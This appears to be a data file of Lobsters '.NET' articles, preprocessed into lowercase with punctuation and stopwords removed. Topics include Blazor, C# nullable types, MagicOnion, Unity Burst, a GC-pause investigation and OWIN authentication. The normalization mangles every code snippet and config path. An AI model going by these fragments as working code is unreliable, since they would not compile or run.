new project one many template included product since already topic installation continue discussing upgrade path exploring newproject template use learned previous chapter razor class library rcl add telerik ui blazor existing application rcl need add reference library example use private nuget feed acquire telerik ui blazor nuget package open nuget package manager visual stuido shown select package source search telerik display nuget package private feed already available added product installer needed package source easily added manually following guide product documentation nuget reference added need reference static asset library project hostcshtml indexhtml file add library cs javascript interop file head link rel stylesheet href contenttelerikuiforblazortrialcsskendothemedefaultallcss script src contenttelerikuiforblazortrialjstelerikblazorjs defer script commercial license use ref contenttelerikuiforblazor resource head head section also change application theme using cs file path path name csskendothemedefault option choose default bootstrap material shown single change component app use google material design theme link rel stylesheet href contenttelerikuiforblazorcsskendothemematerialallcss telerik ui blazor also requires service dependency injection service easily registered addtelerikblazor method called project entry point startupcs blazor server programcs webassembly blazor server startupcs servicesaddtelerikblazor blazor webassembly programcs builderservicesaddtelerikblazor since many component library likely use throughout project add global scope adding telerikblazor telerikblazorcomponent importsrazor ensure access library anywhere application using telerikblazor using telerikblazorcomponents finally add telerikrootcomponent application mainlayout telerik ui blazor advanced feature like modal window tool tip animation need register root element application telerikrootcomponent facilitate u inherits layoutcomponentbase telerikrootcomponent div class sidebar navmenu div div class main body div telerikrootcomponent installation complete ready begin using telerik ui blazor application get familiar telerik grid modify existing fetchdata component replace static html fully featured component blazor data grid telerik ui blazor data grid long list professional feature data grid capable data binding multiselection contextaware filtering sorting paging theme rowcolumn template multiple edit mode let see feature action replacing hand coded table fetchdata example shown telerik data grid locate code fetchdata page folder replace entire table element telerikgrid component also eliminate null check telerik grid operation internally code removed forecast null p em loading em p else table class table thead tr th date th th temp c th th temp f th th summary th tr thead tbody foreach var forecast forecast tr td forecastdatetoshortdatestring td td forecasttemperaturec td td forecasttemperaturef td td forecastsummary td tr tbody table telerikgrid component bind data property forecast array weatherforecast object grid also pageable filtermode groupable reorderable sortable property enabled inside telerikgrid component define child component field would like displayed grid c code set field property c nameof operator giving u type safety column header customizable title property set header automatically get name property addition template used display custom format image even ui component template used format date field telerikgrid dataforecasts sortabletrue pageabletrue groupabletrue filtermodegridfiltermodefilterrow reorderabletrue gridcolumns gridcolumn field nameof weatherforecastdate template context weatherforecast datetoshortdatestring template gridcolumn gridcolumn field nameof weatherforecasttemperaturef title temp f gridcolumn field nameof weatherforecasttemperaturec title temp c gridcolumn field nameof weatherforecastsummary gridcolumns telerikgrid html replaced telerik grid component rerun application see change shown fully featured grid accessibility compliant adding component project relatively easy step able transform standard html component something much interactive feature rich summary excited part next generation aspnet application supporting blazor telerik ui blazor available download today package includes popular component like data grid scheduler file upload written ground take advantage blazor without javascript framework dependency jquery time folk throughout year microsoft continue working blazor part net plan keeping telerik ui blazor date project progress look forward hearing feedback seeing built knowing component need next app try latest telerik ui blazor
200,Lobsters,dotnet,"C#, F#, .NET programming",Make your next C# project non-nullable,http://blog.hovland.xyz/2019-01-15-make-your-next-csharp-project-non-nullable/,make next c project nonnullable,ten year resharper annotation framework,sure well aware null value responsible load extra uninspiring code ton ton exception crash tony hoare came innovation later apologized call billion dollar mistake example extra null checking need really want requiredfield never null way make compiler enforce hence need checking might find pointless simply substitute one exception nullreferenceexception another argumentnullexception really nullreferenceexception emerge deep within code without hint null forcing sit inspect debug code order find wrong lucky symbol file reference line number exception thrown production code line number often wrong due optimized code symbol file missing altogether argumentnullexception much helpful refer problematic argument hopefully also provide meaningful error message unfortunately often possible know whether reference null leaf u choice sprinkling null check code making vague assumption reference never null example former professional perhaps expected check code like fine many case extra code actually superfluous quite possible somedependency foo bar never null getting hint compiler even inspect code manually conclude case thing may change future somedependency modified mess surprised developer accepted state affair long without rioting certainly easy see called billion dollar mistake fact likely understatement sadly programming language inherited null language like haskell ocaml scala f elm rust chosen make use option type robust alternative option type elegant solution long designed language begin retrofitting language null problematic two way represent missing vale still check null dealing legacy code nevertheless approach taken java new optional type contrast kotlin managed embrace null part language way safe pragmatic possible solution actually quite straightforward focus actually want achieve possible dereference null reference right reference need explicitly one following nonnullable nullable thus possible dereference without null check way available c developer ten year already using resharper annotation framework annotating code attribute resharper help u c type system fall short try set requiredfield null resharper catch get similar warning try dereference optionalfield without checking null really useful far perfect first helpful hint compile error second rely thirdparty tool third forced annotate code problem never really go away resharper default optimistic analysis meaning annotation missing avoiding false alarm deemed important pointing potential code issue fourth annotation exactly making code prettier luckily longer concern c come nullable reference type builtin naming bit confusing reference type always nullable whole problem novelty also nonnullable reason name reference type nonnullable default explicitly nullable using nullable backward compatibility need enable feature code project file also issue detected compiler warning default may want treat warning error class note much cleaner look without extra attribute try set requiredfield null get similar message time compiler naturally also catch dereferencing optionalfield needle say think enable feature new code using following project file setting project sdk microsoftnetsdk propertygroup targetframework targetframework langversion langversion nullablereferencetypes true nullablereferencetypes treatwarningsaserrors true treatwarningsaserrors propertygroup project existing code go ahead enable nullable reference type necessarily going compiler error fixing significant job always risk introduce new bug motivated try see taste expect
201,Lobsters,dotnet,"C#, F#, .NET programming",C# 8: Type Inference for the New Keyword,https://www.infoq.com/news/2019/01/c-sharp-targeted-type-new,c type inference new keyword,targettyped new expression c roadmap feature test plan,many situation one possible type allowed given place yet c still requires explicitly list type targettyped new expression proposal adopted boilerplate code longer necessary superficially feature look like reverse var keyword instead inferring variable type expression infers expression type variable example proposal using current proposed syntax dictionary string list int field new dictionary string list int dictionary string list int field new see simply remove need specify type inferred context local variable interesting come handy shortlived argument xmlreadercreate reader new xmlreadersettings ignorewhitespace true xmlreadercreate reader new ignorewhitespace true code xmlreadersettings class interesting merely holder option value passed xmlreader one could even argue type name xmlreadersettings distracts important information another place feature useful field property var keyword option example private readonly static object ssyncobj new according proposal four exception use enum type enum type contain constant zero desirable use explicit enum member interface type niche feature preferable explicitly mention type array type array need special syntax provide length struct default constructor rule primitive type value type wanted use default value type could write default instead status currently type inference new keyword listed c roadmap status prototype feature test plan available github
202,Lobsters,dotnet,"C#, F#, .NET programming",MagicOnionUnified Realtime/API Engine for.NET Core and Unity,https://medium.com/@neuecc/magiconion-unified-realtime-api-engine-for-net-core-and-unity-21e02a57a3ff,magiconionunified realtimeapi engine fornet core unity,interface strongly typed c zero deserialization mapping messagepack c grpc bidirectional streaming enough choose distributed model grpc supporting api communication swagger deployment hosting conclusion,interface strongly typed c using shared c interface server client clienttoserver servertoclient method calling strongly typed example let say following interface class sharedby server client share errorfree communication established simply implementing interface sidesin way need generate code intermediate language method called network calling even multiple input primitivetype variable manner coherent c syntax course support autocompletionan actual implementation outlined server implement interface defined igaminghubit done asynchronously task relaying return value asynchronous value returned exception caught relayed client grouping group make possible send client group using broadcast group client receive data broadcast server implementing interface defined igaminghubreceiver also igaminghub act network client automatically implemented serverthe client side receive data broadcast server implementing interface defined igaminghubreceiver also igaminghub serf network client automatically implemented serveras everything strongly typed c variable idf refactoring tracked change method name input server side client sideincomplete implementation result compile error allowing spot fix themstringfree communication improves efficiency method name automatically converted id number string sent primitivetype variable sent natural manner need wrap designated request class using protocol buffer need manage proto idl interface definition language worry generate etc long written c none occurszero deserialization mappingin rpc especially realtime communication involving frequent transmission data often serialization process data converted sent limit performance magiconion serialization done messagepack c fastest binary serializer c limiting factor also addition performance also provides flexibility regarding data variable type sent long serialized messagepack c also taking advantage fact client server run c data stored internal memory expected share layout added option mapping memory copy without serializationdeserialization case valuetype variablenothing need processed promise best performance theoretically possible term transmission speed however since structtype variable need copied recommend handling everything ref rule need define large structtype might slow processi believe easily effectively applied sending large number transforms array variableswhy grpc bidirectional streaming enoughgrpc come standard bidirectional streaming implement bidirectional communication fact streaming rpc magiconion constructed upon bidirectional streaming bidirectional streaming definition protorpc bidihello stream hellorequest return stream helloresponse however difficult use bidirectional streaming rpc realtime communication many reason biggest reason since rpc point connection established requestresponse defined using oneof one type containing multiple type must manually branched method need called may feasible still many hurdle example client wait server complete operation request sent next line code executed able wait response mean client receive return value exceptionsthere currently way bundle multiple connectionseven construct system handle issue never escape template bidirectional streaming generated proto mess code magiconion streaminghub us bidirectional streaming establish connection communicates using unique lightweight protocol within communication frame realizing rpc realtime communication feel natural c developerswhy choose distributed model grpcin contrary realtime communication engine unity magiconion load balancer several strategy realize distributed processing recommend using cloud platform piece middleware example hosting internal memory completely independently one way external service discoverymatching service decide server useanother completely distributing load using tcp load balancer delegating process broadcasting group redis make possible send data client connected different server function come standard magiconion magiconionredis suited implementing chat functionality notification etcalso much like grpc magiconion suited implementing called microservices build servertoserver connection construct servertoserverrpc structurenow magiconion built grpc completely ignores need providing languageindependent rpc using proto notable characteristic moreover fact network communication limited tcp necessarily make ideal creating game however good reason chose grpcone reason maturity library library available communication support serverclient implementation including unity core part grpc c shared across language used almost developer including google mean highly stable may possible implement original communication library composed part specific communication game ensuring stability ground easy task reinvent wheel right however satisfied c binding grpc term performance think may good idea keep using grpc c core completely replacing c binding least limited unity side client communication believe feasible effectiveanother reason ecosystem grpc established de facto standard modern rpc supported many server middleware grpc industrystandard protocol many advantage using using nginx requestbased load balancing envoy also many blog slideshows providing information grpc make easier developer build better systemmagiconion original application layer built infrastructure grpc piece middleware shared knowledge almost always applied directlyi believe modern server cloudready architecture system fully utilizes infrastructure middleware supplied cloud provider better chance performing well system attempt everything therefore framework deal infrastructure lightweight composed essential function onlysupporting api communicationthe goal magiconion unified network engine mean unified server client use c realtime communication system api communication system unified api communication system share interface designed generate client code automatically method defined using c syntaxalso api communication everything framework thoroughly made asynchronous nonblocking make look almost natural asyncawait function provided c language also come filtering function hook execution request made also contributes natural asynchronous processingthe filter also used streaminghub mannerswaggerit hard check apis working properly easy debug unity time grpc debugged using tool like postman therefore designed magiconion automatically generates api document executed swagger magiconion act hosting server need set external proxy server need add several line code part handle launchingthis need able check apis working properly defining debug command apis show swagger may possible easily prepare command operate database debuggingstreaminghub support moment planning make websocketgateway connects websocket magiconiondeployment hostingin past biggest issue c server side deploy host running window server fact grpc iisbased made thing even difficult however easy make container using docker nothing special thing using c nothing complicated turning magiconion application generated net core container fact quite easy net core console application done need deploy inside linux container matter whether ec fargate gke ak many online article apply practice directlymaking container come c today really constructing local environment easily carrying thing developmentdeployment environment allowing people particularly familiar c window build rich knowledge infrastructure without learning anything special think largest advantageconclusionyou start using magiconion realtime communication also use api communication perform really well support fast transmission data data serialization designed compression mind make communicationrelated worry go away also asyncawait utilized unity may serve gateway incorporating latest c realtime communication framework provides clientserver rpc however thing need build function depends generally speaking require much work free unnecessary function believe ensures best coding experience come rpc wish could say best performance well thing improved way handle grpc c binding hope able say release next version also independent closed system example use exhibit vrar content keeping server running within lan network even lan network hope give tryi hope able keep writing magiconion well thing going unirx unirxasync messagepack c etc blog
203,Lobsters,dotnet,"C#, F#, .NET programming",Kiwi: High-Level Synthesis for Accelerating Scientific Computation,https://www.cl.cam.ac.uk/research/srg/han/hprls/orangepath/kiwic.html,kiwi highlevel synthesis accelerating scientific computation,kiwi hl kiwi scientific acceleration new site scientific user kiwi hpc hpr l kiwi use case kiwi hardware server realtime accelerator synthesis link nonrentrant enforce hard real time accelerating cpubound application accelerating dataintensive application using networked fpga kiwi talk kiwi online resource demo page pdf html new site larger demo scientific user pdf html,kiwi hl kiwi scientific acceleration kiwi highlevel synthesis hl system primarily generates fpga design c source code compared existing highlevel synthesis tool kiwic support wider subset standard programming language feature particular support multidimensional array threading fileserver io object management limited recursion release kiwic support static heap management memory structure allocated compiletime permanently allocated onfpga ram external dram release kiwic successful test already support arbitrary heapallocation run time implement garbage collection kiwi performance predictor another important design tool enabling hpc user explore expected speed application modify without wait multihour fpga compilation development iteration web page summarises various kiwic example use case hpcfocussed work presented fully kiwi scientific acceleration new site scientific user kiwi hpc kiwi developed university cambridge computer laboratory microsoft research limited headed david greave uoccl satnam singh mrl kiwi continues computer laboratory part logic synthesis project called hpr l us orangepath core library kiwi use case kiwi used generating custom accelerator embedded system used execution platform complete scientific application kiwic compiler operates several design style vary amount control user mapping work hardware clock cycle rate resulting system accept new input argument classical hl generates custom datapath controlling sequencer application application may run exit organised server go busy given new input data extreme generate fullypipelined fixedlatency stream processor tends controlling sequencer instead relies predicated execution little backwards forward forwarding along pipeline us case user application first coded c developed tested user workstation using visual studio mono high performance required selfsame binary file compiled using kiwic programmable hardware fpgas fpgas use little energy run time faster standard workstation everyday use hardware accelerator mpeg compression smart phone would instantly flatten battery done software instead kiwi hardware server realtime accelerator synthesis generating realtime accelerator c function method argument return value designated user target root either using c attribute command line flag kiwic compiler user may also state maximum processing latency also typically state reissue frequency could per clock cycle whether stall flow control allowed realtime accelerator multiple call designated function evaluated concurrently generated hardware operation mutable state including static ram dram allowed care must taken way multiple execution appear interleaved care needed reentrant multithreaded software operating shared variable local variable private invokation note realtime server mode implemented prior hardware server rpcbased implementation link nonrentrant enforce hard real time accelerating cpubound application application involve much io always good candidate fpga execution since fpga io performance facility generally inferior compared standard processor motherboard additionaly application require great deal memory also ideal fpga since fpga dram controller tend little behind latest motherboards however many fpgas considerable onchip static ram fairly high bandwidth connection larger colocated static ram memory footprint issue kiwi work well intensive cpubound application particularly lot bitlevel operation much floating point typical example encryption hashing linear programming latest fpgas much better quality floatingpoint support recently extended class application benefit accelerating dataintensive application using networked fpga fpgas stream big data fileservers via ethernet qpx axi bus zynq platform future fpga platform may become standard offering cloud computing microsoft installed fpgas many cloud blade yet opened fpga resource public programming kiwi form acceleration scientific application parallel programming us parallel construct c language dotnet runtime specifically kiwi consists runtime library native simulation hardware description within c kiwic compiler generates rtl fpga constrainedstylised net bytecode word kiwi developing methodology algorithm acceleration using parallel programming c language specifically kiwi consists runtime library hardware fpga execution algorithm expressed within c compiler kiwic convert dotnet bytecode verilog rtl compilation fpga execution future custom domainspecific front end generate dotnet bytecode used kiwi technology many potential us note kiwihpc highperformance computing scientific acceleration asic hardcore generation standard algorithm implemented silicon mpeg compression routing filtering profiling logic softwaredefined networking rapid transaction processing hardware implementation automated trading algorithm kiwi talk kiwi online resource early hardwarecentric demonstration demo page kiwi scientific acceleration manual web pdf pdf html kiwi scientific acceleration new site larger demo scientific user development kiwic built hpr l library share lot internal implementation compiler jinjoin glue logic synthesiser toy bsv compiler pdf html c david j greave
204,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core Tag Helpers Video Tutorial,https://www.telerik.com/blogs/aspnet-core-tag-helpers-video-tutorial-getting-started-telerik-tag-helpers,aspnet core tag helper video tutorial,telerik ui aspnet core aspnet core tag helper useful link let build app team efficiency dashboard useful link introducing telerik ui aspnet core tag helper useful link let start prototype useful link form basic label date picker tag helper useful link using tree view tag helper master hierarchical data useful link refactoring aspnet core partial tag helper useful link responsive panel useful link tackling data set telerik data grid tag helper useful link handling client side event user interaction useful link using chart tag helper interactive data visualization useful link start free trial telerik ui aspnet core,series video get introduced aspnet core tag helper learn use build better realworld application help telerik ui aspnet core instructional video series handson demo aspnet core tag helper help telerik ui aspnet core learn basic working tag helper building fully functional app using multiple ui component grid chart date picker course guided industry pro scott addie sr content developer microsoft ed charbeneau threetime microsoft mvp aspnet core tag helper really understand aspnet core tag helper make productive begin introduction basic tag helper video learn tag helper added aspnet core improve readability markup better intellisense easier context switching video useful link let build app tag helper video series learn build team efficiency dashboard single page responsive web application application us date picker responsive panel chart grid tree view tag helper create interactive reporting experience video take look completed app building video useful link introducing telerik ui aspnet core tag helper aspnet core come handful tag helper fraction needed build realworld application complete toolbox component telerik ui aspnet core feature tag helper video discus feature telerik ui aspnet core install find documentation get free trial video useful link let start prototype video discus prototype application transform course video series fully functional application prototype application simple bootstrap layout placeholder element replaced telerik ui aspnet core tag helper video useful link form basic label date picker tag helper scott addie introduces u aspnet core label tag helper telerik date picker tag helper introduction show write markup using tag helper discus advantage generated ui video useful link using tree view tag helper master hierarchical data microsoft mvp ed charbeneau show u use telerik aspnet core tree view tag helper tree view tag helper ui component data bound naturally hierarchical data source video useful link refactoring aspnet core partial tag helper video learn refactor application view code partial tag helper partial tag helper new feature aspnet core used encapsulate markup video useful link responsive panel video see create mobile responsive panel responsive panel tag helper tag helper creates drawer collapse screen device small screen size video useful link tackling data set telerik data grid tag helper video learn use telerik data grid tag helper data binding sorting filtering server side functionality discussed video useful link handling client side event user interaction video learn use telerik ui aspnet core client side api using client side event easily add interactivity bind event using aspnet core tag helper video useful link using chart tag helper interactive data visualization view learn use telerik chart tag helper aspnet core client side event used complete demo application video useful link hope video series help get started aspnet core tag helper show telerik ui aspnet core help build realworld application start free trial telerik ui aspnet core try happy coding
205,Lobsters,dotnet,"C#, F#, .NET programming","C++, C# and Unity",http://lucasmeijer.com/posts/cpp_unity/,c c unity,said written valid counter criticism performance correctness great tooling roslyn modifying intermediateil ara path tracer toy project today optimization granularity help common multi threading problem hacking whole stack unitymathemetics distinction engine code game code dissapears user writing physic engine join u postgoodism xoofx deplinenoise icetigris vvuk mikeacton vengefularia bmcnett lucasmeijer mikeacton lucasmeijer jonathan blow,updated post fixed mike twitter handle replaced example traffic system example path tracer lot said written lately game industry c changing thing need feeling valid criticism various thing make c great language game valid counter criticism well dont guy participate openforeveryone process designing c instead bitching sideline let talk place c unity unity advanced game programmer problem end day need provide executable instruction target processor understand executed run game performance cricital part code know want final instruction want easy way describe logic reasonable way trust verify generated instruction one want c great task want loop vectorized million thing happen might make compiler vectorize might vectorized today tomorrow new seemingly innocent change happens convincing cc compiler vectorize code hard took step back figured wow kind crazy popular way generate machine instruction somewhat comfortably cc go rust day great space use competition decided make reasonably comfortable way generate machine code check box care could spend lot energy trying bend c design train little bit direction would work little bit better u much rather spend energy toolchain design design exactly problem game developer checkboxes care performance correctness able say loop reason vectorize compiler error oh code slower still produce correct value biggy crossarchitecture input code write different target io target xbox sound like brainer pulling hair getting c compiler reliably generate instruction want common tableflip write instruction want assembler done nice iteration loop easily see machine code generated architecture change code machine code viewer good job teachingexplaining machine instruction safety game developer safety high priority list think fact really hard memory corruption unity one killer feature mode run code give u clear error great error message readwrite bound dereference null ok know thing care next step need decide input language machinecode generator option custom language adaptionsubset c c subset c say c performance critical inner loop yes c natural choice come lot nice benefit unity language user already use today great ide tooling editingrefactoring well debugging c programmer often idea even possible follow post one day c intermediate il compiler already exists roslyn c compiler microsoft use instead write lot experience modifying intermediateil easy codegen postprocessing actual program quite enjoy writing code c however traditional c whole amazing language come performance c language team standard library team runtime team making great progress last two year still looking language control wherehow data laid memory exactly need top standard library oriented around object heap object pointer reference object said give standard library bye linq stringformatter list dictionary disallow allocation class structs garbage collector dissalow virtual call nonconstrained interface invocation add new container allowed use nativearray friend remaining piece c language looking really good remember performance critical code example ara path tracer toy project subset let u comfortably everything need hot loop valid subset c also run regular c getting error bound access great error message debugger support compilation speed forgot possible working c often refer subset highperformancec hpc today built code generator compiler called burst ship lot work ahead already happy today sometimes faster c also still sometimes slower c latter case consider performance bug confident resolve comparing performance enough though matter equally get performance example took c culling code current c renderer ported burst performance c version incredible gymnastics convince c compiler actually vectorize burst version smaller honest whole move performance critical code c story also result everybody internally unity immediately buying u feel like closer metal use c true much longer use c complete control entire process source compilation machine code generation something like go fix comittee convince value usecase concern balanced slowly surely port every piece performance critical code c hpc easier get performance want harder write bug easier work screenshot burst inspector allowing easily see assembly instruction generated different burst hotloops unity lot different user enumerate entire instruction set memory others happy create thing without getting phd computer science example user benefit part frametime spent running engine code usually get faster part running asset store package runtime code get faster asset store package author adopt hpc advanced user benefit ontop able also write high performance code hpc optimization granularity typical c project setup hard ask compiler make different optimization tradeoff different part program best per file granularity specifying optimization level map poorly want function hot loop want hot loop everything call optimized possible everything call spread many different file burst designed take input entire program single method program entrypoint hot loop compile function everything invokes guaranteed known allow virtual function function pointer burst operates relatively small part program set optimization level burst inlines pretty much every callsite making possible remove check otherwise would removed inlined form information argument function help common multi threading problem c c much help developer write thread safe code even today decade since game consumer hardware core hard write program use multiple core effectively data race nondeterminism deadlock challenge make shipping multi threading code difficult want feature like make sure function everything call never read write global state want violation rule compiler error guideline hope programmer adhere burst give compiler error encourage user write jobified code splitting data transformation need happen job job functional sideeffect free explicitely specifies readonly buffer readwrite buffer operates attempt access data result compiler error job scheduler guarantee nobody writing readonly buffer job running guarantee nobody reading readwrite buffer job running schedule job violates rule get runtime error every time unlucky race condition case error message explain trying schedule job want read buffer already scheduled job write want need specify previous job dependency find safety mechanism catch lot bug get committed result efficient use core becomes impossible code deadlock race condition result guaranteed deterministic regardless many thread running many time thread get interrupted process hacking whole stack able hack component get benefit making aware eachother example common case vectorization happening compiler guarantee two pointer point memory aliasing know two nativearray never alias wrote collection library use knowledge burst give optimization afraid two array pointer might point memory similarly wrote unitymathemetics math library burst intimite knowledge future able accuracy sacrificing optimization thing like mathsin burst mathsin c method compile understand trigonometric property sin understand sin x x small value x burst might able prove understand replaced taylor series expansion certain accuracy sacrifice distinction engine code game code dissapears writing unity runtime code hpc engine game written language runtime system converted hpc distribute source everyone able learn improve tailor level playing field nothing stopping user writing better particle system physic system renderer write expect many people user writing physic engine completely user code ship hpc physic engine internal development process much like user development process also feel user pain directly focus effort improving single workflow instead two different one join u many game industry veteran non veteran unhappy status quo decided join u make tech post reality hi postgoodism xoofx deplinenoise icetigris vvuk mikeacton vengefularia bmcnett changing status quo language tool game development something would also love work love hear ping lucasmeijer mike acton mikeacton interested future going build comment website say hi twitter lucasmeijer footnote thank arasp reviewing post jonathan blow working interesting language compiler called jai sharing motivation unity going spend another year making game let make sure tool love using
206,Lobsters,dotnet,"C#, F#, .NET programming",Announcing Try F# on WebAssembly,https://forums.websharper.com/blog/86246,announcing try f webassembly,read cookie policy,site us cooky tracking technology assist navigation ability provide feedback analyse use product servicesread cookie policyaccept cookiesrefuse cooky
207,Lobsters,dotnet,"C#, F#, .NET programming",War Story – The Mystery Of The Very Long GC Pauses in .NET Windows Service,http://tooslowexception.com/scenario-mystery-of-the-very-long-gc-pauses-in-net-windows-service/,war story mystery long gc pause net window service,tamir dresher clarizen rxnet action gc duration minute smell like environmentinfrastructure problem investigation abnormal long unexplainable wait never see callstack production solution dmitry rudakov bug background gc issue considered fixed conclusion net gc misconfiguration net gc bug bug application code injected module antivirus software creating subtle memory corruption gc innocent victim solving often mix expertise intuition bit luck rarely analysis run straight one planned point another,part consultancy job pleasure help various customer problem could described collectively gcrelated memoryrelated general one day tamir dresher clarizen company btw author rxnet action contacted extremely interesting message emphasis mine experiencing phenomenon gc duration minute backend server think session perhaps idea find root cause minute infinity see something like one thought come mind something really serious must happening nowadays problem may diagnosed remotely signing ndas could go straight attacking problem clarizen provided wellprepared concise summary architecture current finding internal monitoring tool based kibana indeed looked gc introduces endless pause netbased window service completely freezing job processing represented incoming message rabbitmq example single day monitoring showing number various job different bar colour processed per time clearly every hour mysterious gap representing even long processing period job processing pause day engineer clarizen connected pause time gc measurement hitting value minute time gc measurement day process size hit gb maximum small sure reason gigantic pause introduced observed pause could correlated event metric including generation size overall cpu usage mystic time gc hitting minute unfortunately problem could reproduced ad hoc interesting happening one server cluster others smell like environmentinfrastructure problem investigation even first thing wanted make sure gc mode process running window service treated desktop application run workstation gc default seen high inefficiency data processing much often window service work like requestprocessing server turned clarizen already tried path everything set properly best result observed background server gc workstation flavour pause hit even half hour clearly high time saw deeper insight gc working perfview rescue started typical overall view gc running etw gconly session hour waiting problem occurrence perfviewexe nogui accepteula merge true gconly collect longgcanalysis recorded session confirmed mysterious pause made even unexplainable long gc pause visible pause time millisecond gcstats report perfview see series slow gc even second ephemeral gc generation take much time abnormal sure question causing event confirming nonsense like long unexplainable wait beginning gc managed thread suspension start gc etw gcrelated event event view perfview moreover markwithtype etw event could notice ridiculous gap time spent mark phase gc markwithtype etw event showing long marking time mark phase looking event various heapnum type revealing delay level several second eventually sum second long overall gc time also note promoted size huge long time could explained traversing abnormally huge heap whole process heap big mentioned earlier decided go even deeper gc analysis get cpu sampling profiling following path described maoni recent never see callstack production blog post perfviewexe nogui accepteula kernelevents memory virtualalloc default onlyproviders norundown nongenrundown noclrrundown merge true zip true collect process processname unfortunately clear reason unable get measurement even try honest expecting see confirmation huge time spend markrelated function gc next step would take memory dump frozen service mysterious gc pause indeed happened side solution fortunately time dmitry rudakov one clarizen engineer able identify issue digging various memory dump taken mysterious pause moreover problem seemed strengthen even process crash happening time great analysis following finding path root cause identification able identify something looked like deadlock inside gc mark phase code gc thread waiting svr tjoin join method within svr gcheap markphase one svr gcheap scandependenthandles called dmitry suspected may caused kind heap corruption confirmed corruption indeed happens verifyheap so command executed severals memory dump taken one crash dump access violation exception caught happened directly inside gc thread within svr gcheap method thus abnormal behaviour lead somehow marking phase gc confirms previous finding moment dmitry identified two possible reason heap corruption oracledataaccessdll orm seems cause problem indeed used diagnosed service similar case found le clearly connect problem library bug background gc antivirus software injecting module job server process suspicion arose observed access violation caused module injected obfuscated someantivirusdll exr ntdll exceptioncode access violation exceptionflags parameter parameter write address k childsp retaddr call ntdll ntdll kernelbase suspicion defined followup action plan quite clear disable background gc machine disable antivirus software observe result disabling background gc disabling concurrent flavour gc setting gcconcurrent flag false config helped entirely problem seemed disappear nonconcurrent gc inefficient typical workload service observed time gc processing time acceptable however least kind confirmation background gc something bug service behaviour background gc disabled marked region disabling antivirus software guess graph change applied clearly since one day issue gone fact completely uninstalling antivirus proper fix excluding net assembly enough please note fix worked even background server gc still running service behaviour antivirus software disabled moment issue considered fixed uninstalling particular antivirus software machine mysterious long gc pause disappeared conclusion gc interesting beast operates vast majority process memory make fragile memory corruption may happen within process word gc cause accessviolation mystery sideeffects fact intensively operating process memory complex concurrent gc flavour intensifies fragility much easier concurrently running thread reveal invalid memory state exactly case considered bug net gc misconfiguration net gc bug bug application code injected module antivirus software creating subtle memory corruption gc innocent victim lot various hypothesis may come revealed way marking gc phase traversing managed heap maybe subtle heap state corruption pushed long processing loop much deeper analysis would probably provide direct answer mystery obviously solution found time investment deeper investigation unjustified interesting aspect gcrelated issue come solving often mix expertise intuition bit luck rarely analysis run straight one planned point another kudos go dmitry rudakov eventually solved issue exactly mix ingredient hope article provide insight attack long gc pause issue happens future see disclaimer purpose obfuscated detail could point specific antivirus software used believe contains major bug revealing everywhere would unfair blame general rather believe subtle combination environment software version used maybe even net framework used reveals bug particular scenario rather blaming particular antivirus software article purpose show attack problem interesting solution may eventually found particular completely related software
208,Lobsters,dotnet,"C#, F#, .NET programming",Configure .NET Authentication in OWIN,https://developer.okta.com/blog/2018/12/05/configure-dotnet-auth-in-owin,configure net authentication owin,visual studio understand owin contract add owin authentication net framework web application create new aspnet project great blog post add owin startup file startup file recognition brilliant write microsoft doc set authentication okta create new foreverfree developer account create okta application define application variable handle authentication method controller update view authentication capability run aspnet web application learn owin aspnet core secure authentication github page oktadev facebook linkedin youtube,open web interface net owin standard defines interface web application web server prior standard net tight coupling net application internet information server ii led great difficulty trying expand different web applicationserver technology introduction owin created abstraction application server completely decouples one thanks whole process lot easier whether want use net application alternative web server want use alternative web application technology ii standard integral part creation aspnet core streamlines dependency required side tutorial learn basic concept owin apply acquired knowledge implementation user authentication within aspnet web application need follow along copy visual studio understand owin contract contract defined owin applicationserver communication found within iappbuilder interface core boiled two piece environment dictionary function register middleware environment dictionary outline state requestresponse simplifies mapping string key object within property property within domain net framework http request following required key key type description owinrequestbody stream body request owinrequestheaders idictionary string string header request owinrequestmethod string http request method eg post get owinrequestpath string path request relative root application delegate owinrequestpathbase string root part request path owinrequestprotocol string protocol name version eg owinrequestquerystring string query string component request uri sans leading eg mktenus owinrequestscheme string uri scheme eg http fortunately need remember key value plus optional one listed abstracted away property everpresent iowincontext instance think httpcontext instance streamlined owin second part contract register middleware middleware sense module sits user sending request developer handling example authentication geolocation middleware component server would look like following programmatic term view middleware func return task object async equivalent void function take abovementioned iowincontext instance essentially pointer next function chain eg next middleware module structure style within one function process request invoke next component process response code would look like async context nextfunction contextrequestquerygetvalues mkt count multiple market query parameter invoke following function pipeline await nextfunctioninvoke contextresponsestatuscode return status code note owinresponsestatuscode optional field add owin authentication net framework web application mentioned owin standard net core however net framework requires extra effort get implemented tutorial working latter additionally authenticate using okta platform sign page host create new aspnet project first create new project visual studio type aspnet web application net framework name whatever want next screen select mvc template authentication note okta also work great web api like read topic another great blog post aspnet mvc project finished setting need add new nuget package microsoftowinhostsystemweb integral part running owin pipeline ii provides owin context httpcontext microsoftowinsecuritycookies required cookiebased authentication oktaaspnet contains middleware functionality authenticating user package dependency installed environment ready work however make thing little easier later alter port project url standard make change go project property onto web tab page see project url text field value http localhost change port number save note might prompted port assigned elsewhere needing create virtual directory say yes add owin startup file owin set mean startupcs file file contains definition configuration method take iappbuilder instance aforementioned owin contract declare middleware require visual studio template specifically file add selecting new option context menu example call standard name startupcs completed new class configuration method created tutorial two objective set cookie authentication default add okta middleware handle authentication two separate concern best write two separate method go detail public void configuration iappbuilder app setcookieauthenticationasdefault app addoktaauthenticationmiddleware app use cookie authentication need state intention plus set default authentication type private void setcookieauthenticationasdefault iappbuilder app appsetdefaultsigninasauthenticationtype cookieauthenticationdefaultsauthenticationtype appusecookieauthentication new cookieauthenticationoptions add authentication middleware okta made really easy adding extension method specifically iappbuilder instance call predefined option private void addoktaauthenticationmiddleware iappbuilder app appuseoktamvc new oktamvcoptions oktadomain configurationmanagerappsettings okta oktadomain clientid configurationmanagerappsettings okta clientid clientsecret configurationmanagerappsettings okta clientsecret redirecturi configurationmanagerappsettings okta redirecturi postlogoutredirecturi configurationmanagerappsettings okta postlogoutredirecturi getclaimsfromuserinfoendpoint true scope new list string openid profile email note us systemconfiguration configurationmanager express variable ease part webconfig file worry value get later set okta account startup file recognition startupcs file need follow set naming convention implement specific interface common question application know file use answer one three possible option default namespace naming convention application check default namespace startupcs file option lowest precedence owinstartup assembly attribute following along example may noticed part templatecreated startupcs file attribute defined top assembly owinstartup typeof oktatutorialowinstartup turn tell application find startup method adding new appsetting appstartup configuration file alternatively could outline startup file wish use within webconfig file appsettings option 